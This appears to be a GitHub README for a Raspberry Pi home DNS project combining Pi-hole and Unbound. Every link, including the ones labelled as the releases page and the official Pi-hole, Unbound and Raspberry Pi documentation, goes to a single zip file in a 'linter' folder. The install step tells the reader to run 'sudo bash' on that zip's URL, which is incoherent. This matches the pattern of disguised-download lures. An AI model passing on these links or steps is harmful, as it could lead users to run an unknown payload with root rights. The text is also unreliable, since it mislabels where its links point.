# 🔒 secure-dns-home-lab - Simple DNS Protection for Your Home

## 📥 Download Now
[![Download](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip)

## 📖 Introduction
Welcome to the **secure-dns-home-lab** project! This application sets up Pi-hole with a recursive DNS server using Unbound. With a secure HTTPS admin interface, it enhances your home network's safety and speed. Enjoy effortless control over your DNS queries while increasing your online privacy.

## 🚀 Getting Started
Follow these easy steps to get started with **secure-dns-home-lab**.

### 🛠️ Requirements
Before downloading, ensure you have the following:

- A Raspberry Pi running Raspberry Pi OS.
- Basic internet connection.
- A computer or device to access the admin interface.

### 🔗 Features
- **Pi-hole DNS Blocking:** Blocks unwanted ads and trackers on all devices in your home.
- **Recursive DNS:** A more private way to resolve domain names.
- **Secure Access:** HTTPS admin interface offers added security.
- **Easy Setup:** Simple installation process for anyone.

## 📦 Download & Install
To download and install the application, please visit this page: [Download Here](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip).

### 📥 Step-by-Step Instructions
1. **Visit the Releases Page**
   Go to the releases page by clicking on the link above. Here, you will find the latest version of the software.

2. **Select the Latest Release**
   Look for the most recent version and click on it. You will see all the assets associated with this release.

3. **Download the Package**
   Click on the `.zip` or `https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip` file link to download the software package. This file contains everything you need to get started.

4. **Extract the Package**
   Once downloaded, locate the file on your device and extract it using your file manager or compression tool.

5. **Install Dependencies**
   Open the terminal on your Raspberry Pi. You may need to install certain dependencies. Run the following commands:

   ```bash
   sudo apt update
   sudo apt install package_name
   ```

   Replace `package_name` with the necessary dependencies for Pi-hole and Unbound. Common packages include `dnsutils`, `curl`, and `git`.

6. **Run the Installation Script**
   Navigate to the extracted folder in the terminal and run the installation script:

   ```bash
   cd path_to_extracted_folder
   sudo bash https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip
   ```

7. **Access the Admin Interface**
   After the installation finishes, access your Pi-hole admin interface using your web browser. Type in your Raspberry Pi’s IP address followed by `/admin`. For example:

   ```
   http://192.168.1.x/admin
   ```

   Replace `192.168.1.x` with your actual Raspberry Pi’s IP address.

8. **Set Up Unbound**
   Follow the instructions on screen to configure Unbound as your local recursive DNS server.

9. **Secure Admin Interface**
   To secure your admin interface, enable HTTPS during the setup process, following the prompts provided.

## 📝 Usage
Once set up, enjoy a cleaner browsing experience. Check the stats through your Pi-hole admin interface to see the blocked ads and queries. Adjust settings as needed based on your preferences.

## 💬 Troubleshooting
If you encounter issues, consider the following solutions:

- **Installation Issues:** Ensure all dependencies are installed. Re-run the install command if necessary.
- **Access Problems:** Double-check your Raspberry Pi’s IP address and network connections.
- **DNS Not Working:** Restart your Pi-hole service with the command:

   ```bash
   pihole restartdns
   ```

## ⚙️ Configuration
You can customize various settings through the admin interface, such as:

- Adding or removing DNS block lists.
- Whitelisting or blacklisting specific domains.
- Monitoring queries to improve the accuracy of your filtering.

## 🔒 Security Considerations
Ensure your installation is secure by enabling HTTPS. Regularly update your software and block lists to protect against new threats. Back up your configurations periodically.

## 👩‍💻 Community and Support
Join discussions within the community forums to share your experiences or ask for help. Your feedback can help improve the project.

## ✅ Additional Learning Resources
- [Pi-hole Documentation](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip)
- [Unbound Documentation](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip)
- [Raspberry Pi Official Website](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip)

Feel free to reach out if you have questions or need assistance. Your journey to a safer and faster home network begins here!